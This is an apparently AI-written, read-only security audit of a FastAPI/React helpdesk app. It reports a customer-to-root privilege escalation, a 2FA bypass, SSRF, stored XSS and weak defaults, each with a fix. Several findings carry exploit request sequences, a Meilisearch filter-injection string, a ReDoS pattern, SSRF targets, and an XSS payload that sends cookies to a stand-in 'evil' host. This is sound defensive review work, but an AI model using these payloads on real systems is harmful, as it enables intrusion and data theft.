# Tiqora Security Review — Fable

| | |
|---|---|
| **Date** | 2026-07-21 |
| **Reviewer** | Fable |
| **Model** | claude-fable-5 |
| **Repo** | `/Users/valerius/git/aurix` (branch `main`, `c9c7493`) |
| **Scope** | Backend `backend/src/tiqora/` (Python 3.12 / FastAPI), frontend `frontend/src/` (React 19 / TS), deploy examples. AuthN/AuthZ, GenericInterface compat layer, injection, web (XSS/CSRF/SSRF/redirect), secrets & deployment defaults, MCP server & webhooks. |
| **Method** | Manual read of the auth/session/permission core, the compat operations + dynamic router, the MCP server, and the customer portal; three parallel focused audits (injection, secrets/deploy/SSRF, XSS/login-paths) whose concrete findings were re-verified against source. READ-ONLY — no code modified. |

---

## Executive summary

Tiqora's *primary* API surface (the `/api/v1` agent API and `/api/portal` customer portal) is, on the whole, carefully built: SQL is consistently parameterised, the customer portal enforces per-customer ticket ownership with no IDOR, article HTML is double-defended (server-side `nh3` sanitisation + a sandboxed, same-origin-less iframe), LDAP filter values are escaped, SPNEGO trusts only a verified GSSAPI context (no `X-Forwarded-User` spoofing), and the TOTP/WebAuthn pending/enroll token separation on the normal login path is correctly enforced.

The serious problems are concentrated in the **Znuny GenericInterface compatibility layer** (`api/compat/`), which is mounted **unconditionally** (`api/app.py:127`, no feature flag) and which re-implements authentication and authorization independently of the hardened `/api/v1` path — and gets both wrong:

1. **Any valid customer-portal user is mapped to the Znuny system/root agent (`user_id = 1`)** for every compat ticket operation, giving external customers agent-level read/write across queues (privilege escalation / broken access control). **Critical.**
2. **The compat layer authenticates with password only and issues a real, first-class session token**, completely bypassing the TOTP/WebAuthn 2FA that the normal login enforces. **High.**

Alongside these, production-hardening defaults are unsafe (default `secret_key` and non-`Secure` cookies both accepted in a `TIQORA_ENV=production` image), webhook delivery has no SSRF guard, and there is one stored-XSS sink in the agent search UI.

### Severity counts

| Severity | Count |
|----------|-------|
| Critical | 1 |
| High | 5 |
| Medium | 7 |
| Low | 4 |
| Info / positive | (see §Info) |

---

## Critical

### C-1 — Customer-portal users are elevated to the Znuny root agent (`user_id=1`) in the compat layer
**File:** `backend/src/tiqora/api/compat/operations.py:103-104`, `:122-134`, `:362-370`
**Category:** Broken access control / privilege escalation / IDOR

The compat auth resolver maps a customer identity to the **system/root agent user id `1`** and then runs all authorization against that id:

```python
# _auth_from_params — stored customer session (user_id 0 → root):
if stored_user_id == 0:
    return (1, stored_login, _CUSTOMER_USER_TYPE)          # operations.py:103-104
...
# _auth_from_params — CustomerUserLogin + Password:
# Map customer to system user_id=1 (root) — customers have no direct agent user_id
return (1, customer_login, _CUSTOMER_USER_TYPE)            # operations.py:133-134
```

`op_session_create` accepts `CustomerUserLogin`+`Password` and mints a token with `user.id = 0` (`operations.py:352-370`); on any subsequent compat call the stored-session branch above rewrites that `0` to `1`.

Every compat ticket operation then authorises against `user_id = 1`:
- `op_ticket_search` → `pe.groups_for_permission(1, "ro")` (`operations.py:977`) → returns whatever queues root can read.
- `op_ticket_get` → same `ro` group set (`operations.py:744`).
- `op_ticket_create` → `pe.check(1, queue_id, "create")` (`operations.py:428`).
- `op_ticket_update` → `pe.check(1, queue_id, "rw")` (`operations.py:562`).

**Exploit:** An external customer with valid portal credentials `alice@example.com` sends:
```
POST /znuny-compat/Session   {"CustomerUserLogin":"alice@example.com","Password":"..."}
→ {"SessionID":"<t>"}
POST /znuny-compat/TicketSearch   {"SessionID":"<t>"}      # or GET with query params
→ every ticket the root agent (id 1) can read — i.e. across queues, other customers' tickets
GET  /znuny-compat/Ticket/<id>?SessionID=<t>&AllArticles=1&Attachments=1
→ full ticket body + internal articles + attachments
PATCH /znuny-compat/Ticket/<id>  {"SessionID":"<t>","Ticket":{"State":"closed"},"Article":{...}}
→ modify tickets, inject articles, reassign owner/queue — as root
```
In a default Znuny database the `root@localhost` user (id 1) is a member of the `admin` group and is typically granted broad queue permissions, so this is effectively full ticket-store read/write for anyone holding a single customer login. Even where root's queue grants are narrower, mapping an *external customer* onto an *agent* identity is a categorical trust-boundary break: the portal (`domain/portal_ticket_service.py:115`) scopes customers to `ticket.customer_user_id == customer.login`, and the compat layer discards that scoping entirely.

**Fix:** Do not map customers to an agent id. Either (a) reject `CustomerUserLogin` in the agent GenericInterface operations and give customers a separate, ownership-scoped code path (mirroring `PortalTicketService`), or (b) if Znuny-compat customer access must exist, carry `user_type == "Customer"` through and filter tickets by `customer_user_id`/`customer_id` ownership rather than by agent queue-group permissions. Never fall back an unknown/`0` principal to `1`.

---

## High

### H-1 — Compat layer bypasses TOTP/WebAuthn 2FA enforcement
**File:** `backend/src/tiqora/api/compat/operations.py:317-371` (`op_session_create`) and `:108-120` (inline `UserLogin`+`Password`); reachable full-session use via `backend/src/tiqora/api/deps.py:96-104`
**Category:** Authentication / 2FA bypass

The normal login (`api/v1/auth.py:118-126`) checks `two_factor_enabled(user)` and, when true, issues only a **pending** token that cannot resolve to a full session until TOTP/passkey is presented; it also honours `effective_enforce` forced enrollment. The compat `SessionCreate` does none of this:

```python
# op_session_create, agent branch:
if row is None or not verify_password(password, row.pw or ""):
    return _err("SessionCreate.AuthFail", ...)
...
token = await session_store.create(user.id, user.login)   # operations.py:370
return {"SessionID": token}
```

`session_store.create` is the **same** Redis store that `AuthService.resolve_session` reads, and `get_current_user` accepts a raw session token presented as `Authorization: Bearer` (`deps.py:96-104`, the "MCP / CLI convenience" branch). So a token minted by the password-only compat endpoint is a fully privileged agent session for the entire `/api/v1` API.

**Exploit:** An agent on whom 2FA is enforced runs:
```
POST /znuny-compat/Session  {"UserLogin":"agent","Password":"..."}  → {"SessionID":"tok"}
GET  /api/v1/tickets   Authorization: Bearer tok
```
and is authenticated with no second factor. The inline `_auth_from_params` `UserLogin`+`Password` branch grants the same password-only access directly to every compat operation.

**Fix:** Reject the compat password/`SessionCreate` path for accounts with 2FA enabled/enforced (require a pre-issued API key instead), or route it through the same `two_factor_enabled`/pending-token gate. Separately, consider not letting an opaque *session* token be used as a bearer credential — restrict `Authorization: Bearer` to `tiqora_*` API keys so a compat/session token can never stand in for API-key auth.

### H-2 — Default `secret_key` silently accepted in production; encrypts secrets at rest
**File:** `backend/src/tiqora/config.py:24-27`
**Category:** Secrets management

```python
secret_key: str = Field(default="change-me-in-production-use-openssl-rand", ...)
```
No startup guard rejects this default when `environment == "production"` (the `Dockerfile` bakes `TIQORA_ENV=production`, and `docker-compose.example.yml` supplies the placeholder as a shell fallback — see M-3). `crypto/secret.py` derives the Fernet key as `SHA-256(secret_key)`, which encrypts stored SMTP passwords, channel credentials, and TOTP secrets. A copy-paste deployment therefore encrypts all of these under a publicly known key.

**Exploit:** Anyone who reads the DB (a backup leak, a future SQLi, a snapshot) can reconstruct the Fernet key from the known default string and decrypt every stored SMTP/channel credential and TOTP seed offline.
**Fix:** In `get_settings()` / app startup, hard-fail when `environment == "production"` and `secret_key` equals the default or is shorter than ~32 bytes.

### H-3 — Session cookies not `Secure` by default in the production image
**File:** `backend/src/tiqora/config.py:80-83`; used at `api/v1/auth.py:70-78` and `api/portal/auth.py:39-47`
**Category:** Session security

```python
session_cookie_secure: bool = Field(default=False, ...)
```
The production image sets `TIQORA_ENV=production` but nothing flips this to `True`, and the compose example does not set `TIQORA_SESSION_COOKIE_SECURE`. Agent and customer opaque session tokens are then sent over any plain-HTTP path (a misconfigured proxy, or the directly published `:8000`), enabling session hijack by a network MITM. (`HttpOnly` and `SameSite=lax` are correctly set — good.)
**Fix:** Default `secure=True` when `environment == "production"`, and set the env var in the compose example.

### H-4 — Webhook delivery has no SSRF guard
**File:** `backend/src/tiqora/worker/webhooks.py:73` (`client.post(webhook.url, ...)`); target stored unvalidated by `backend/src/tiqora/api/v1/admin/webhooks.py:66-72`
**Category:** SSRF

The webhook target URL comes straight from an admin-created row (`WebhookCreate` does not constrain scheme/host) and the worker POSTs a signed, retried request to it with no allowlist/denylist and no redirect suppression.
**Exploit:** Point a webhook at `http://169.254.169.254/latest/meta-data/...`, `http://127.0.0.1:6379` (Redis), or any internal-only service — a clean, retried, blind-SSRF primitive against the cloud metadata endpoint and the internal network. Any actor who reaches admin (or a stored-config-injection chain) gains it.
**Fix:** Validate the URL before sending — block non-`http(s)` schemes and reject when the *resolved* IP is loopback/link-local/private/metadata (`169.254.169.254`, RFC1918, `::1`, ULA). Re-resolve/pin at connect time to defeat DNS-rebinding, and disable redirect following.

### H-5 — Stored XSS in agent search results (`highlight()` `<em>` raw pass-through)
**File:** `frontend/src/routes/agent/SearchPage.tsx:11-17` (sinks at `:135-181` via `dangerouslySetInnerHTML`)
**Category:** XSS

```js
function highlight(text, q) {
  if (!text) return "";
  if (/<em>/i.test(text)) return text;   // returns RAW, unescaped, un-sanitized
  ...
}
```
The `<em>` fast-path is meant to preserve Meilisearch-highlighted snippets, but `domain/search.py` does not HTML-escape `title`/`excerpt` at index time (`search.py:182-188`) and `search()` does not request Meili highlighting (no `attributesToHighlight`), so any `<em>` present is attacker-supplied. If a string merely *contains* `<em>` anywhere, the entire raw string is injected into the agent DOM (app origin, not the sandboxed article iframe).

**Exploit:** Send an inbound email whose subject/body contains
`<em>x</em><img src=x onerror="fetch('//evil/'+document.cookie)">`.
When any agent searches and the ticket surfaces, the payload executes as the authenticated agent (drive the API as them, exfiltrate CSRF tokens, etc.). The session cookie is `HttpOnly`, but same-origin action-as-agent is fully available.
**Fix:** Remove the raw `<em>` pass-through — always `escapeHtml` and re-insert `<mark>`, or run the string through DOMPurify with an allowlist of only `<em>`/`<mark>`. Also HTML-escape `title`/`excerpt` server-side.

---

## Medium

### M-1 — Meilisearch filter injection → queue-permission bypass in MCP `ticket_search`
**File:** `backend/src/tiqora/mcp_server/server.py:311-315`
```python
filters = [f"queue_id IN [{','.join(str(q) for q in allowed_queues)}]"]
if state_type:        filters.append(f"state_type = '{state_type}'")
if customer_user_id:  filters.append(f"customer_user_id = '{customer_user_id}'")
```
`state_type`/`customer_user_id` are MCP tool arguments interpolated into the Meili filter with naive quoting and no escaping. The mandatory permission clause `queue_id IN [...]` is ANDed with the rest, and Meili binds `AND` tighter than `OR`. A crafted `customer_user_id` of `x' OR queue_id > 0 OR customer_user_id = 'x` yields `(queue_id IN [allowed] AND customer_user_id = 'x') OR queue_id > 0 OR ...`, defeating the queue restriction and returning tickets from queues the calling agent may not read. (The DB fallback `_db_search` is safe — bound `:cuid`.)
**Fix:** Escape single quotes / validate the values against an allowlist charset, or build the filter via the SDK's structured filter API.

### M-2 — Default Meilisearch master key
**File:** `backend/src/tiqora/config.py:42-45` (`"tiqora-dev-master-key"`); compose fallback `${MEILI_MASTER_KEY:-change-me-meili-master-key}`
Any container/network neighbour with the known key can read the full ticket + KB index. (Meili is not port-published in the example — mitigating.)
**Fix:** No default; require it explicitly.

### M-3 — Compose example starts a "production" stack on known placeholder secrets
**File:** `docker-compose.example.yml`
Every secret uses a shell fallback (`${POSTGRES_PASSWORD:-change-me}`, `${MEILI_MASTER_KEY:-change-me-meili-master-key}`, `${TIQORA_SECRET_KEY:-change-me-use-openssl-rand-hex-32}`) while `TIQORA_ENV: production`, so `docker compose up` with no `.env` boots a "production" stack whose DB password, Meili key, and Fernet-deriving app secret are all publicly known (compounds H-2). Ports `8000`/`8001` are published on all interfaces.
**Fix:** Use `${VAR:?set in .env}` so compose refuses to start when unset; document binding `127.0.0.1:` behind a proxy.

### M-4 — OIDC discovery/token/userinfo fetched from an admin-controlled issuer (SSRF)
**File:** `backend/src/tiqora/domain/oidc.py:38-41`, `:71`, `:78`
`discover()` builds the URL from `settings.oidc_issuer` and `GET`s it server-side; subsequent calls hit issuer-advertised `token_endpoint`/`userinfo_endpoint` — attacker-controllable if the issuer/discovery doc is malicious. No private-IP guard. Lower than H-4 because the issuer is meant to be a single trusted IdP, and TLS verification is on (no `verify=False`).
**Fix:** Restrict `oidc_issuer` to an operator allowlist and apply the same private-IP guard to discovered endpoints.

### M-5 — SMS gateway posts to a configurable URL with no guard
**File:** `backend/src/tiqora/channels/sms/gateway.py:57-66`
POSTs to an operator-configured `webhook_url` with no validation — same SSRF class as H-4, lower exposure. (WhatsApp gateway hardcodes `https://graph.facebook.com` — safe.)
**Fix:** Apply the shared outbound-URL SSRF validator.

### M-6 — Outbound SMTP: admin-controlled host, no TLS context / STARTTLS not enforced
**File:** `backend/src/tiqora/domain/mail_outbound.py`, `backend/src/tiqora/channels/email/smtp.py:54`,`:74-87`; admin test at `api/v1/admin/mail_outbound.py:146-170`
SMTP host/port/security come from an admin DB row; `security` defaults to `"none"` (`config.py` `smtp_use_tls=False`) and no verifying `tls_context`/`validate_certs` is passed to `aiosmtplib`. An admin can point mail (with password auth) at an arbitrary internal host, sent in cleartext with no STARTTLS requirement.
**Fix:** Pass an explicit verifying `tls_context`; refuse plaintext auth over `security="none"`.

### M-7 — No brute-force / rate limiting on password auth
**File:** `backend/src/tiqora/api/compat/operations.py:108-136`, `:335-361`; `backend/src/tiqora/api/v1/auth.py` login
Neither the compat password paths nor the main login apply lockout/throttling. Combined with C-1/H-1, the always-on compat `SessionCreate` is an unauthenticated, unthrottled credential-guessing oracle for both agent and customer passwords.
**Fix:** Add per-account/per-IP throttling and lockout, especially on the compat endpoints.

---

## Low

### L-1 — ReDoS via admin-supplied GDPR erasure selector regexes
**File:** `backend/src/tiqora/gdpr/erasure.py:409`, `:416`
`re.compile(selector.login_regex)` / `customer_id_regex` come from the erasure request body and run with `re.search` over every `customer_user` row. A catastrophic pattern (e.g. `(a+)+$`) is a valid, uncaught CPU-exhaustion DoS. Auth+write-gated to admins, so impact is an authenticated self-DoS.
**Fix:** Run under a size cap / timeout, or document the trust boundary.

### L-2 — Open-redirect hardening: protocol-relative `next`
**File:** `frontend/src/routes/LoginPage.tsx:65-66`,`:90-91`
`search.next.startsWith("/")` also accepts `//evil.com`. Real-world impact is low because navigation is via TanStack Router `navigate({to})` (treated as an in-app pathname), and the portal variant already uses `startsWith("/portal")`.
**Fix:** Require `next.startsWith("/") && !next.startsWith("//")` (and reject `/\`).

### L-3 — Dev compose exposes datastores on all interfaces with trivial creds
**File:** `docker-compose.dev.yml`
MariaDB (`root`/`root`, `tiqora`/`tiqora`), Postgres, Redis (no auth), Meili all published as `"3306:3306"` etc. on `0.0.0.0`. Dev-only by design, but reachable on an untrusted LAN.
**Fix:** Prefix published ports with `127.0.0.1:`.

### L-4 — CORS: no guard against a credentialed wildcard
**File:** `backend/src/tiqora/api/app.py:93-99`
Default `cors_origin_list` is localhost (safe), but `allow_credentials=True` with `allow_methods/headers=["*"]`. If an operator sets `TIQORA_CORS_ORIGINS=*`, Starlette mirrors the request origin and allows any site to make credentialed requests.
**Fix:** Reject `*` in `cors_origin_list` at startup.

---

## Info — verified safe (evidence)

- **SQL injection — none found.** Every value-bearing `text(...)` uses bound params (`operations.py:1101-1104,1119,1148-1153`; `_lookup_session:147-153`; drafts/tickets throughout). Identifier interpolation is allowlisted, never user input: `gdpr/erasure.py:1773 _qi()` enforces `^[A-Za-z_][A-Za-z0-9_]*$` and every caller passes fixed literals or values read back from `tiqora_gdpr_backup`; the compat `TicketSearch` builder interpolates only `int(fid)` and generated `:qN/:sN/:cuN` placeholders. Dynamic-field names are constrained to `^DynamicField_([a-zA-Z0-9]+)$` (`operations.py:1139`).
- **Customer portal ownership — no IDOR.** `PortalTicketService` scopes every read/write to `Ticket.customer_user_id == customer.login` (plus `customer_id`/`customer_user_customer` mappings) — `portal_ticket_service.py:115-140,234`; internal (non-customer-visible) articles are never returned (`tickets.py:75`).
- **LDAP — injection & anonymous-bind safe.** `domain/_ldap_core.py` escapes filter values via `escape_filter_chars` and short-circuits empty login/password before any bind (`:86-87`).
- **SPNEGO — no proxy-header spoofing.** Principal comes only from a verified GSSAPI context (`domain/spnego.py`, `api/v1/auth.py:522-579`); no `REMOTE_USER`/`X-Forwarded-User` trust anywhere in `backend/src`, plus a per-agent `sso_eligible` gate.
- **OIDC callback — state validated.** One-time Redis `state` key (`token_urlsafe(24)`, 300s TTL, deleted on use); no auto-provisioning; userinfo flow over server-side code exchange (adding PKCE/nonce would harden further).
- **2FA pending/enroll separation — enforced.** `PENDING:`/`ENROLL:`-prefixed payloads make `SessionStore.get()`'s `int()` parse fail, so the normal `resolve_session`/`get_current_user` path cannot resolve a pending/enroll cookie to a full session (`domain/auth.py:65-75,94-164`). (This makes the compat 2FA gap in H-1 the sole bypass.)
- **Article HTML rendering — double-defended.** Server-side `nh3` strict allowlist strips event handlers, blocks `javascript:`, forces `rel=noopener` (`domain/article_html.py:133-142`); the agent UI renders HTML bodies in an `<iframe sandbox="allow-scripts">` **without** `allow-same-origin` plus a restrictive CSP (`ArticleBodyRenderer.tsx`). KB Markdown passes `marked` output through `DOMPurify.sanitize` (`MarkdownView.tsx:21-23`).
- **Dockerfile — runs non-root** (`useradd --uid 10001 tiqora` + `USER tiqora`); `.env.example` contains only labelled dev placeholders; keytab is env-referenced only (no secret in repo). Feature flags (`schema_ownership`, `oidc_enabled`, `spnego_enabled`, `ldap_enabled`, `smtp_enabled`, crypto flags) default off; `dev_seed`/`dev_anonymize` are CLI-only, not HTTP-mounted.
- **MCP tool authz** correctly builds the same `PermissionEngine` queue-group context per call from a hashed API-key principal (`mcp_server/server.py:135-217,258-282`) — sound apart from M-1.
